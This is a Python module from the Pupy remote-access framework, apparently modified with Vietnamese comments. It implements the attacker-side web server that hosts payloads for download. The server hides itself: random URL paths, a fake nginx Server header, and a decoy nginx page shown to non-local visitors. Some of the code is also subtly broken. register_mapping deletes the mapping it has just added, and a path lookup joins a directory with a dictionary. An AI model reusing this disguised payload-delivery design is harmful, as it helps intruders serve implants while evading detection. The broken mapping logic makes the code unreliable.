#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2017, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root
# of the project for the detailed licence terms


__all__ = [
    'RequestHandler', 'WebSocketHandler'
]

import sys
import threading
import random
import string
import tornado.ioloop
import tornado.web
import tornado.template

from os import path, unlink
from ssl import create_default_context

from tornado.websocket import WebSocketHandler as TornadoWebSocketHandler
from tornado.web import RequestHandler as TornadoRequestHandler
from tornado.web import StaticFileHandler as TornadoStaticFileHandler
from tornado.web import ErrorHandler as TornadoErrorHandler
from tornado.web import Application as TornadoApplication

from pupy.pupylib.PupyOutput import Error
from pupy.pupylib.PupyOutput import Success
from pupy.pupylib.utils.kill_port import kill_process_on_port

from socket import getaddrinfo
from socket import error as socket_error
import time
from threading import Lock

LOCAL_IPS = ('127.0.0.1', '::1')

SERVER_HEADER = 'nginx/1.13.8'

_rate_limit_lock = Lock()
_rate_limit_by_ip = {}


def setup_local_ips(klass, kwargs):
    config = kwargs.pop('config', None)

    setattr(klass, 'config', config)
    setattr(klass, 'local_ips', LOCAL_IPS)

    if not config:
        return

    local_ips_cnf = klass.config.get('webserver', 'local_ips')
    if not local_ips_cnf:
        return

    local_ips_set = set()
    for item in local_ips_cnf.split(','):
        item = item.strip()
        try:
            gai = getaddrinfo(item, None)
        except socket_error:
            continue

        for result in gai:
            for addr in result[4]:
                local_ips_set.add(addr)

    klass.local_ips = tuple(local_ips_set)


def _check_web_auth(handler):
    """Trả về True nếu qua auth (local IP hoặc token đúng)."""
    if handler.request.remote_ip in getattr(handler, 'local_ips', LOCAL_IPS):
        return True
    config = getattr(handler, 'config', None)
    if not config:
        return False
    token = (config.get('webserver', 'auth_token') or '').strip()
    if not token:
        return False
    header_token = (handler.request.headers.get('X-Auth-Token') or '').strip()
    try:
        query_token = (handler.get_argument('token', default='') or '').strip()
    except Exception:
        query_token = ''
    return (header_token == token) or (query_token == token)


def _check_rate_limit(handler):
    """Trả về True nếu trong giới hạn, False nếu vượt (trả 429)."""
    config = getattr(handler, 'config', None)
    if not config:
        return True
    try:
        limit = config.getint('webserver', 'rate_limit_per_minute')
    except Exception:
        limit = 0
    if limit <= 0:
        return True
    ip = handler.request.remote_ip
    now = time.time()
    with _rate_limit_lock:
        if ip not in _rate_limit_by_ip:
            _rate_limit_by_ip[ip] = []
        times = _rate_limit_by_ip[ip]
        times[:] = [t for t in times if now - t < 60]
        if len(times) >= limit:
            return False
        times.append(now)
    return True


class ErrorHandler(TornadoErrorHandler):
    def initialize(self, **kwargs):
        setup_local_ips(self, kwargs)
        super(ErrorHandler, self).initialize(**kwargs)

    def set_default_headers(self):
        self.set_header('Server', SERVER_HEADER)


class WebSocketHandler(TornadoWebSocketHandler):
    def initialize(self, **kwargs):
        setup_local_ips(self, kwargs)
        super(WebSocketHandler, self).initialize(**kwargs)

    def set_default_headers(self):
        self.set_header('Server', SERVER_HEADER)

    def prepare(self, *args, **kwargs):
        if not _check_web_auth(self):
            self.set_status(403)
            self.finish('Connection not allowed (local IP or valid token required)')
            return
        if not _check_rate_limit(self):
            self.set_status(429)
            self.finish('Rate limit exceeded')
            return
        super(WebSocketHandler, self).prepare(*args, **kwargs)


class RequestHandler(TornadoRequestHandler):
    def initialize(self, **kwargs):
        setup_local_ips(self, kwargs)
        super(RequestHandler, self).initialize(**kwargs)

    def set_default_headers(self):
        self.set_header('Server', SERVER_HEADER)

    def prepare(self, *args, **kwargs):
        if not _check_web_auth(self):
            self.set_status(403)
            self.finish('Connection not allowed (local IP or valid token required)')
            return
        if not _check_rate_limit(self):
            self.set_status(429)
            self.finish('Rate limit exceeded')
            return
        super(RequestHandler, self).prepare(*args, **kwargs)


class StaticTextHandler(TornadoRequestHandler):
    def initialize(self, **kwargs):
        self.content = kwargs.pop('content')
        setup_local_ips(self, kwargs)

        super(StaticTextHandler, self).initialize(**kwargs)

    def set_default_headers(self):
        self.set_header('Server', SERVER_HEADER)

    async def get(self):
        self.finish(self.content)


class PayloadsHandler(TornadoStaticFileHandler):
    def set_default_headers(self):
        self.set_header('Server', SERVER_HEADER)

    def initialize(self, **kwargs):
        self.mappings = kwargs.pop('mappings', {})
        self.templates = kwargs.pop('templates', {})

        setup_local_ips(self, kwargs)

        super(PayloadsHandler, self).initialize(**kwargs)

    def prepare(self, *args, **kwargs):
        if not _check_web_auth(self):
            self.set_status(403)
            self.finish('Connection not allowed (local IP or valid token required)')
            return
        if not _check_rate_limit(self):
            self.set_status(429)
            self.finish('Rate limit exceeded')
            return
        super(PayloadsHandler, self).prepare(*args, **kwargs)

    def get_absolute_path(self, root, filepath):
        if filepath in self.mappings:
            mapped_path = self.mappings[filepath]

            if path.isfile(mapped_path):
                return path.abspath(mapped_path)

            elif path.isfile(path.join(root, self.mappings)):
                return path.abspath(
                    path.join(root, self.mappings))

        return super(PayloadsHandler, self).get_absolute_path(root, filepath)


class IndexHandler(RequestHandler):
    def initialize(self, **kwargs):
        setup_local_ips(self, kwargs)
        super(IndexHandler, self).initialize(**kwargs)

    def set_default_headers(self):
        self.set_header('Server', SERVER_HEADER)

    async def get(self):
        if self.request.remote_ip in self.local_ips:
            self.render("index.html")
        else:
            self.render("nginx_index.html")


class PupyWebServer(object):
    def __init__(self, pupsrv, config):
        self.pupsrv = pupsrv
        self.config = config
        self.clients = {}
        self.mappings = {}

        self.ssl = False

        self.wwwroot = self.config.get(
            'webserver', 'static_webroot_uri', None
        ) or self.random_path()

        self.preserve_payloads = self.config.getboolean(
            'webserver', 'preserve_payloads'
        )

        self.root = self.config.get_folder('wwwroot')

        self.app = None

        self._thread = None
        self._ioloop = None

        self.listen = (config.get('webserver', 'listen') or '').strip() or '127.0.0.1:9000'
        if ':' in self.listen:
            hostname, port = self.listen.rsplit(':', 1)
            try:
                port = int(port.strip())
            except (ValueError, TypeError):
                port = 9000
            self.hostname, self.port = hostname.strip(), port
        else:
            self.hostname = self.listen
            self.port = 9000

        self.served_files = set()
        self.aliases = {}
        self.show_requests = self.config.getboolean('webserver', 'log')

    def log(self, handler):
        if not self.show_requests:
            return

        message = 'Web: '

        if handler.request.uri in self.aliases:
            message += '({}) '.format(self.aliases[handler.request.uri])

        message += handler._request_summary()

        if handler.get_status() < 400:
            self.pupsrv.info(Success(message))
        else:
            self.pupsrv.info(Error(message))

    def start(self):
        webstatic = self.config.get_folder('webstatic', create=False)
        cert = self.config.get('webserver', 'cert', None)
        key = self.config.get('webserver', 'key', None)

        self.app = TornadoApplication(
            [
             (r'/', IndexHandler),
             (self.wwwroot + '/(.*)', PayloadsHandler, {
                 'path': self.root,
                 'mappings': self.mappings,
             }),
            ],
            debug=False, template_path=webstatic,
            log_function=self.log,
            default_handler_class=ErrorHandler,
            default_handler_args={
                'status_code': 404,
            }
        )
        self.app.pupsrv = self.pupsrv

        ssl_options = None

        if key and cert:
            ssl_options = create_default_context(
                certfile=cert, keyfile=key, server_side=True)
            self.ssl = True

        # Chỉ kill process đang chiếm port khi config bật (tránh kill nhầm)
        if self.config.getboolean('webserver', 'kill_port_before_bind'):
            kill_process_on_port(self.port, wait_after_sec=0.5)

        # IOLoop phải chạy trong thread riêng; app.listen() PHẢI gọi từ trong thread đó
        # để server gắn đúng IOLoop. Gọi listen() ở main thread khiến server gắn IOLoop
        # của main (main lại chạy pupycmd.loop()) nên không bao giờ xử lý request → loading mãi.
        self._ioloop = tornado.ioloop.IOLoop(make_current=False)

        def run_server_in_thread():
            self._ioloop.make_current()
            self.app.listen(
                self.port,
                address=self.hostname,
                ssl_options=ssl_options)
            self._ioloop.start()

        self._thread = threading.Thread(target=run_server_in_thread)
        self._thread.daemon = True
        self._thread.start()

        self._registered = {}

    def stop(self):
        self._ioloop.stop()
        self._ioloop = None
        self._thread = None

        for (_, _, cleanup) in self._registered.values():
            if cleanup:
                cleanup()

        self.mappings = {}
        self.aliases = {}

        if self.preserve_payloads:
            return

        for filepath in self.served_files:
            if path.isfile(filepath):
                unlink(filepath)

    def get_random_path_at_webroot(self):
        while True:
            filename = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(10))

            filepath = path.join(self.root, filename)
            if not path.isfile(filepath):
                return filepath, filename

    def random_path(self):
        return '/' + ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(10))

    def register_mapping(self, name, path):
        name = self.random_path()
        self.mappings[name] = path
        if name in self.mappings:
            del self.mappings[name]

    def is_registered(self, name):
        return self._registered.get(name, (None, None, None))[0]

    def serve_content(self, content, alias=None, as_file=True):
        uri = None

        if as_file:
            filepath, filename = self.get_random_path_at_webroot()
            try:
                with open(filepath, 'wb') as out:
                    out.write(content)
                self.served_files.add(filepath)
            except (IOError, OSError):
                if path.isfile(filepath):
                    unlink(filepath)

                raise

            uri = self.wwwroot + '/' + filename
        else:
            uri = self.random_path()
            self.app.add_handlers('.*', [(
                uri, StaticTextHandler, {
                    'content': content
                })])

        if alias:
            self.aliases[uri] = alias

        return uri

    def start_webplugin(self, name, web_handlers, cleanup=None):
        random_path = self.random_path()

        if name in self._registered:
            random_path, _, _ = self._registered[name]
            return self.port, random_path

        klasses = []

        for tab in web_handlers:
            if len(tab) == 2:
                uri_path, handler = tab
                kwargs = {}
            else:
                uri_path, handler, kwargs = tab

            ends_with_slash = uri_path.endswith('/')
            uri_path = '/'.join(
                x for x in [random_path] + uri_path.split('/') if x
            )

            if ends_with_slash:
                uri_path += '/'

            klasses.append(handler)

            if issubclass(handler, (
                ErrorHandler, WebSocketHandler, RequestHandler,
                    StaticTextHandler, PayloadsHandler, IndexHandler)):

                kwargs['config'] = self.config

            self.app.add_handlers(".*", [(uri_path, handler, kwargs)])
            self.pupsrv.info('Register webhook for {} at {}'.format(
                name, uri_path
            ))

        self._registered[name] = random_path, klasses, cleanup

        return self.port, random_path

    def stop_webplugin(self, name):

        if name not in self._registered:
            return

        self.pupsrv.info('Unregister webhook for {}'.format(name))

        random_path, klasses, cleanup = self._registered[name]
        removed = False

        to_remove = []
        for rule in self.app.wildcard_router.rules:
            if rule.target in klasses:
                to_remove.append(rule)
                removed = True
            elif rule.matcher.regex.pattern.startswith(random_path):
                to_remove.append(rule)
                removed = True

        for rule in to_remove:
            self.app.wildcard_router.rules.remove(rule)

        to_remove = []
        for rule in self.app.default_router.rules:
            if rule.target in klasses:
                to_remove.append(rule)
                removed = True
            elif rule.matcher.regex.pattern.startswith(random_path):
                to_remove.append(rule)
                removed = True

        if cleanup:
            cleanup()

        if removed:
            del self._registered[name]
        else:
            self.pupsrv.info('{} was not found [error]'.format(name))
